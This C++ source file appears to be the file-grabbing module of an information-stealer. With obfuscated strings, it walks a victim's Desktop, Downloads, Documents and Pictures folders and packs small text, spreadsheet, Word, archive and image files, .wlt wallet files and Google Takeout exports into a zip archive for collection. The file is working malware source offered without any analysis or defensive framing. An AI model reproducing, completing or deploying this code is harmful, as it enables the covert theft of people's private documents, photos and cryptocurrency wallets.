#include "grabbing.h"

#include "../../winapi/winapi.h"

#include "../../utilities/crt/crt.h"
#include "../../utilities/xor/xor.h"
#include "../../utilities/tools/tools.h"
#include "../../utilities/zip_handle/zip_handle.h"
#include "../../utilities/directories/directories.h"

#include <fstream>
#include <filesystem>

grabbing g_grabbing;

void grabbing::is_desktop(std::string path)
{
	int m_hTextFileCount = 15;
	int m_hRARFileCount = 15;
	int m_hZIPFileCount = 15;
	int m_hPNGFileCount = 15;
	int m_hJPGFileCount = 15;
	int m_hJPEGFileCount = 15;
	int m_hCSVFileCount = 15;
	int m_hXLSXFileCount = 15;
	int m_hDOCXFileCount = 15;

	for (auto &p : std::filesystem::directory_iterator(path.c_str()))
	{
		if (p.path().extension() == XOR_STRING(".txt"))
		{
			if (m_hTextFileCount > 0)
			{
				if (p.file_size() > GRABBING_INFO_FILES_SIZE)
				{
					continue;
				}
				else
				{
					std::string from = path.c_str() + p.path().stem().string() + std::string(XOR_STRING(".txt"));
					std::string file_name = std::string(XOR_STRING("Desktop/")) + p.path().stem().string() + std::string(XOR_STRING(".txt"));
					std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

					g_zip.write_zip(file_name.c_str(), buffer);
				}

				m_hTextFileCount--;
			}
		}
		else if (p.path().extension() == XOR_STRING(".rar"))
		{
			if (m_hRARFileCount > 0)
			{
				if (p.file_size() > GRABBING_ARCHIVE_FILES_SIZE)
				{
					continue;
				}
				else
				{
					std::string from = path.c_str() + p.path().stem().string() + std::string(XOR_STRING(".rar"));
					std::string file_name = std::string(XOR_STRING("Desktop/")) + p.path().stem().string() + std::string(XOR_STRING(".rar"));
					std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

					g_zip.write_zip(file_name.c_str(), buffer);
				}

				m_hRARFileCount--;
			}
		}
		else if (p.path().extension() == XOR_STRING(".zip"))
		{
			if (m_hZIPFileCount > 0)
			{
				if (p.file_size() > GRABBING_ARCHIVE_FILES_SIZE)
				{
					continue;
				}
				else
				{
					std::string from = path.c_str() + p.path().stem().string() + std::string(XOR_STRING(".zip"));
					std::string file_name = std::string(XOR_STRING("Desktop/")) + p.path().stem().string() + std::string(XOR_STRING(".zip"));
					std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

					g_zip.write_zip(file_name.c_str(), buffer);
				}

				m_hZIPFileCount--;
			}
		}
		else if (p.path().extension() == XOR_STRING(".png"))
		{
			if (m_hPNGFileCount > 0)
			{
				if (p.file_size() > GRABBING_IMAGE_FILES_SIZE)
				{
					continue;
				}
				else
				{
					std::string from = path.c_str() + p.path().stem().string() + std::string(XOR_STRING(".png"));
					std::string file_name = std::string(XOR_STRING("Desktop/")) + p.path().stem().string() + std::string(XOR_STRING(".png"));
					std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

					g_zip.write_zip(file_name.c_str(), buffer);
				}

				m_hPNGFileCount--;
			}
		}
		else if (p.path().extension() == XOR_STRING(".jpg"))
		{
			if (m_hJPGFileCount > 0)
			{
				if (p.file_size() > GRABBING_IMAGE_FILES_SIZE)
				{
					continue;
				}
				else
				{
					std::string from = path.c_str() + p.path().stem().string() + std::string(XOR_STRING(".jpg"));
					std::string file_name = std::string(XOR_STRING("Desktop/")) + p.path().stem().string() + std::string(XOR_STRING(".jpg"));
					std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

					g_zip.write_zip(file_name.c_str(), buffer);
				}

				m_hJPGFileCount--;
			}
		}
		else if (p.path().extension() == XOR_STRING(".jpeg"))
		{
			if (m_hJPEGFileCount > 0)
			{
				if (p.file_size() > GRABBING_IMAGE_FILES_SIZE)
				{
					continue;
				}
				else
				{
					std::string from = path.c_str() + p.path().stem().string() + std::string(XOR_STRING(".jpeg"));
					std::string file_name = std::string(XOR_STRING("Desktop/")) + p.path().stem().string() + std::string(XOR_STRING(".jpeg"));
					std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

					g_zip.write_zip(file_name.c_str(), buffer);
				}

				m_hJPEGFileCount--;
			}
		}
		else if (p.path().extension() == XOR_STRING(".csv"))
		{
			if (m_hCSVFileCount > 0)
			{
				if (p.file_size() > GRABBING_INFO_FILES_SIZE)
				{
					continue;
				}
				else
				{
					std::string from = path.c_str() + p.path().stem().string() + std::string(XOR_STRING(".csv"));
					std::string file_name = std::string(XOR_STRING("Desktop/")) + p.path().stem().string() + std::string(XOR_STRING(".csv"));
					std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

					g_zip.write_zip(file_name.c_str(), buffer);
				}

				m_hCSVFileCount--;
			}
		}
		else if (p.path().extension() == XOR_STRING(".xlsx"))
		{
			if (m_hXLSXFileCount > 0)
			{
				if (p.file_size() > GRABBING_INFO_FILES_SIZE)
				{
					continue;
				}
				else
				{
					std::string from = path.c_str() + p.path().stem().string() + std::string(XOR_STRING(".xlsx"));
					std::string file_name = std::string(XOR_STRING("Desktop/")) + p.path().stem().string() + std::string(XOR_STRING(".xlsx"));
					std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

					g_zip.write_zip(file_name.c_str(), buffer);
				}

				m_hXLSXFileCount--;
			}
		}
		else if (p.path().extension() == XOR_STRING(".docx"))
		{
			if (m_hDOCXFileCount > 0)
			{
				if (p.file_size() > GRABBING_INFO_FILES_SIZE)
				{
					continue;
				}
				else
				{
					std::string from = path.c_str() + p.path().stem().string() + std::string(XOR_STRING(".docx"));
					std::string file_name = std::string(XOR_STRING("Desktop/")) + p.path().stem().string() + std::string(XOR_STRING(".docx"));
					std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

					g_zip.write_zip(file_name.c_str(), buffer);
				}

				m_hDOCXFileCount--;
			}
		}
	}
}

void grabbing::is_user_downloads(std::string path)
{
	int m_hTextFileCount = 35;
	int m_hCSVFileCount = 35;

	for (auto &p : std::filesystem::directory_iterator(path.c_str()))
	{
		if (p.path().extension() == XOR_STRING(".txt"))
		{
			if (m_hTextFileCount > 0)
			{
				if (p.file_size() > GRABBING_INFO_FILES_SIZE)
				{
					continue;
				}
				else
				{
					std::string from = path.c_str() + p.path().stem().string() + std::string(XOR_STRING(".txt"));
					std::string file_name = std::string(XOR_STRING("User Downloads/")) + p.path().stem().string() + std::string(XOR_STRING(".txt"));
					std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

					g_zip.write_zip(file_name.c_str(), buffer);
				}

				m_hTextFileCount--;
			}
		}
		else if (p.path().extension() == XOR_STRING(".csv"))
		{
			if (m_hCSVFileCount > 0)
			{
				if (p.file_size() > GRABBING_INFO_FILES_SIZE)
				{
					continue;
				}
				else
				{
					std::string from = path.c_str() + p.path().stem().string() + std::string(XOR_STRING(".csv"));
					std::string file_name = std::string(XOR_STRING("User Downloads/")) + p.path().stem().string() + std::string(XOR_STRING(".csv"));
					std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

					g_zip.write_zip(file_name.c_str(), buffer);
				}

				m_hCSVFileCount--;
			}
		}
	}

	std::string takeout_file = path.c_str() + std::string(XOR_STRING("takeout-*"));

	WIN32_FIND_DATA file_data;
	HANDLE handle = g_winapi.FindFirstFileA(takeout_file.c_str(), &file_data);

	std::string takeout_file_founded = path.c_str() + std::string(file_data.cFileName);
	if (g_tools.check_directory(takeout_file_founded.c_str()) == FILE_FOUNDED)
	{
		std::string file_name = std::string(XOR_STRING("User Downloads/")) + std::string(file_data.cFileName);
		std::string buffer = g_tools.read_file(takeout_file_founded.c_str(), std::ios::app);

		g_zip.write_zip(file_name.c_str(), buffer);
	}

	if (handle) {
		g_winapi.CloseHandle(handle);
	}
}

void grabbing::is_user_documents(std::string path)
{
	int m_hTextFileCount = 35;
	int m_hCSVFileCount = 35;
	int m_hWLTFileCount = 35;

	for (auto &p : std::filesystem::directory_iterator(path.c_str()))
	{
		if (p.path().extension() == XOR_STRING(".txt"))
		{
			if (m_hTextFileCount > 0)
			{
				if (p.file_size() > GRABBING_INFO_FILES_SIZE)
				{
					continue;
				}
				else
				{
					std::string from = path.c_str() + p.path().stem().string() + std::string(XOR_STRING(".txt"));
					std::string file_name = std::string(XOR_STRING("User Documents/")) + p.path().stem().string() + std::string(XOR_STRING(".txt"));
					std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

					g_zip.write_zip(file_name.c_str(), buffer);
				}

				m_hTextFileCount--;
			}
		}
		else if (p.path().extension() == XOR_STRING(".csv"))
		{
			if (m_hCSVFileCount > 0)
			{
				if (p.file_size() > GRABBING_INFO_FILES_SIZE)
				{
					continue;
				}
				else
				{
					std::string from = path.c_str() + p.path().stem().string() + std::string(XOR_STRING(".csv"));
					std::string file_name = std::string(XOR_STRING("User Documents/")) + p.path().stem().string() + std::string(XOR_STRING(".csv"));
					std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

					g_zip.write_zip(file_name.c_str(), buffer);
				}

				m_hCSVFileCount--;
			}
		}
		else if (p.path().extension() == XOR_STRING(".wlt"))
		{
			if (m_hWLTFileCount > 0)
			{
				if (p.file_size() > GRABBING_INFO_FILES_SIZE)
				{
					continue;
				}
				else
				{
					std::string from = path.c_str() + p.path().stem().string() + std::string(XOR_STRING(".wlt"));
					std::string file_name = std::string(XOR_STRING("User Documents/")) + p.path().stem().string() + std::string(XOR_STRING(".wlt"));
					std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

					g_zip.write_zip(file_name.c_str(), buffer);
				}

				m_hWLTFileCount--;
			}
		}
	}
}

void grabbing::is_user_images(std::string path)
{
	int m_hJPGFileCount = 15;
	int m_hJPEGFileCount = 15;
	int m_hPNGFileCount = 15;

	for (auto &p : std::filesystem::directory_iterator(path.c_str()))
	{
		if (p.path().extension() == XOR_STRING(".jpg"))
		{
			if (m_hJPGFileCount > 0)
			{
				if (p.file_size() > GRABBING_IMAGE_FILES_SIZE)
				{
					continue;
				}
				else
				{
					std::string from = path.c_str() + p.path().stem().string() + std::string(XOR_STRING(".jpg"));
					std::string file_name = std::string(XOR_STRING("User Photos/")) + p.path().stem().string() + std::string(XOR_STRING(".jpg"));
					std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

					g_zip.write_zip(file_name.c_str(), buffer);
				}

				m_hJPGFileCount--;
			}
		}
		else if (p.path().extension() == XOR_STRING(".jpeg"))
		{
			if (m_hJPEGFileCount > 0)
			{
				if (p.file_size() > GRABBING_IMAGE_FILES_SIZE)
				{
					continue;
				}
				else
				{
					std::string from = path.c_str() + p.path().stem().string() + std::string(XOR_STRING(".jpeg"));
					std::string file_name = std::string(XOR_STRING("User Photos/")) + p.path().stem().string() + std::string(XOR_STRING(".jpeg"));
					std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

					g_zip.write_zip(file_name.c_str(), buffer);
				}

				m_hJPEGFileCount--;
			}
		}
		else if (p.path().extension() == XOR_STRING(".png"))
		{
			if (m_hPNGFileCount > 0)
			{
				if (p.file_size() > GRABBING_IMAGE_FILES_SIZE)
				{
					continue;
				}
				else
				{
					std::string from = path.c_str() + p.path().stem().string() + std::string(XOR_STRING(".png"));
					std::string file_name = std::string(XOR_STRING("User Photos/")) + p.path().stem().string() + std::string(XOR_STRING(".png"));
					std::string buffer = g_tools.read_file(from.c_str(), std::ios::app);

					g_zip.write_zip(file_name.c_str(), buffer);
				}

				m_hPNGFileCount--;
			}
		}
	}
}

void grabbing::run()
{
	if (g_tools.check_directory(g_dir.get_dekstop().c_str()) == DIR_FOUNDED)
	{
		is_desktop(g_dir.get_dekstop().c_str());
	}

	if (g_tools.check_directory(g_dir.get_downloads().c_str()) == DIR_FOUNDED)
	{
		is_user_downloads(g_dir.get_downloads().c_str());
	}

	if (g_tools.check_directory(g_dir.get_documents().c_str()) == DIR_FOUNDED)
	{
		is_user_documents(g_dir.get_documents().c_str());
	}

	if (g_tools.check_directory(g_dir.get_images().c_str()) == DIR_FOUNDED)
	{
		is_user_images(g_dir.get_images().c_str());
	}
}